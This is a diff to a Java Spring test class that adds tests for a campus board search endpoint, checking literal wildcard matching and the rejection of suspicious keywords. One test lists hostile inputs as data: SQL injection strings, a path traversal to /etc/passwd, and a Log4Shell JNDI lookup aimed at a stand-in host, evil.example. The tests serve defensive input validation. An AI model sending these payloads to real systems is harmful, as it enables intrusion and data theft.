@@ -446,6 +446,49 @@ class BoardControllerTests {
     }
 
     @Test
+    void treatsBoardSearchWildcardsAsLiteralCharacters() throws Exception {
+        User student = userRepository.findByEmail("student1@campus.local").orElseThrow();
+        boardPostRepository.save(new BoardPost(
+                student,
+                "literal %_ marker board post",
+                "board search should match literal percent underscore token %_",
+                LocalDateTime.now()
+        ));
+        boardPostRepository.save(new BoardPost(
+                student,
+                "plain board post",
+                "this record should not match a literal percent underscore search",
+                LocalDateTime.now().minusMinutes(1)
+        ));
+
+        mockMvc.perform(get("/api/board/posts")
+                        .param("keyword", "%_")
+                        .with(user(studentPrincipal)))
+                .andExpect(status().isOk())
+                .andExpect(jsonPath("$.totalElements").value(1))
+                .andExpect(jsonPath("$.items[0].title").value("literal %_ marker board post"));
+    }
+
+    @Test
+    void handlesAttackLikeBoardKeywordsWithoutServerError() throws Exception {
+        String[] keywords = {
+                "' OR 1=1 --",
+                "union select password from users--",
+                "%27%20or%201=1--",
+                "../../../../etc/passwd",
+                "${jndi:ldap://evil.example/a}"
+        };
+
+        for (String keyword : keywords) {
+            mockMvc.perform(get("/api/board/posts")
+                            .param("keyword", keyword)
+                            .with(user(studentPrincipal)))
+                    .andExpect(status().isBadRequest())
+                    .andExpect(jsonPath("$.reasonCode").value("SUSPICIOUS_REQUEST_BLOCKED"));
+        }
+    }
+
+    @Test
     void returnsNotFoundForUnknownBoardApiPath() throws Exception {
         mockMvc.perform(post("/api/board/posts/{id}/update-typo", 146L)
                         .with(user(studentPrincipal))
